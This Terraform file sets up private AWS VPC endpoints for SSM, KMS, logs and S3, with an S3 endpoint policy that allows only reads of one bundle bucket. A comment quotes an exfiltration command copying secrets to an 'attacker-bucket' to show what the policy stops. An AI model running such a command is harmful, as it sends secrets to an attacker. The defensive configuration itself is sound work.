# VPC endpoints: the only AWS services the host can talk to, all over private IPs.
#   S3 (gateway)           pull the bundle and repo once at boot
#   ssm, ssmmessages, ec2messages   shell + port forwarding without SSH or a public IP
#   kms                    decrypt EBS / S3 / SSM SecureStrings
#   logs                   CloudWatch agent, if you add one

locals {
  interface_endpoints = ["ssm", "ssmmessages", "ec2messages", "kms", "logs"]
}

resource "aws_security_group" "endpoints" {
  name        = "${var.name}-endpoints"
  description = "HTTPS from inside the VPC to interface endpoints"
  vpc_id      = aws_vpc.this.id

  ingress {
    description = "HTTPS from VPC"
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = [var.vpc_cidr]
  }
}

resource "aws_vpc_endpoint" "interface" {
  for_each            = toset(local.interface_endpoints)
  vpc_id              = aws_vpc.this.id
  service_name        = "com.amazonaws.${var.region}.${each.key}"
  vpc_endpoint_type   = "Interface"
  subnet_ids          = [aws_subnet.private.id]
  security_group_ids  = [aws_security_group.endpoints.id]
  private_dns_enabled = true
}

resource "aws_vpc_endpoint" "s3" {
  vpc_id            = aws_vpc.this.id
  service_name      = "com.amazonaws.${var.region}.s3"
  vpc_endpoint_type = "Gateway"
  route_table_ids   = [aws_route_table.private.id]

  # Endpoint policy: through this endpoint you can ONLY read the ndani bucket.
  # Stops `aws s3 cp secrets s3://attacker-bucket` even with stolen credentials.
  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect    = "Allow"
      Principal = "*"
      Action    = ["s3:GetObject", "s3:ListBucket"]
      Resource  = [aws_s3_bucket.bundle.arn, "${aws_s3_bucket.bundle.arn}/*"]
    }]
  })
}

data "aws_ec2_managed_prefix_list" "s3" {
  name = "com.amazonaws.${var.region}.s3"
}
